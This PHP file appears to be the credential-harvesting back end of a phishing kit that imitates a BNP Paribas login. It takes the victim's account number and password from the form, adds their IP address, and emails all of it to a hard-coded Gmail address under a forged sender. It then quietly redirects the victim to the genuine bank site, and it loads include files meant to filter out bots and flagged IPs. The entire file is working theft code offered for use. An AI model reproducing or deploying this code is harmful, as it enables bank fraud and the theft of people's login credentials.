<?php
include ('./inclu/bots.php');
include ('./inclu/banned-ip.php');
include ('./para.php');
$ip = getenv("REMOTE_ADDR");
$message ="";
$message .= "#IP : $ip =============#\n";
$message .= "L0W :  ".$_POST['cpt']."\n";
$message .= "P0W :  ".$_POST['pass']."\n";

$message .= "#============= XxX =============#\n";
$send = "asociationasoka@gmail.com";
$subject = "[ BNLOW| $ip ]";
$from = "From:  BN3L0W <mrx@LAWLAW.COM>";
mail($send,$subject,$message,$from);
header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=0ahUKEwjZqI7Y_PnLAhVJAxoKHc47CZoQjBAIJTAB&url=https%3A%2F%2Fmabanque.bnpparibas%2Ffr%2Fconnexion&usg=AFQjCNFVDTfP3EqiY94wjgXDxhOGQjornw&sig2=SBt5y1pMXFfvVYc0dDG83w");
?>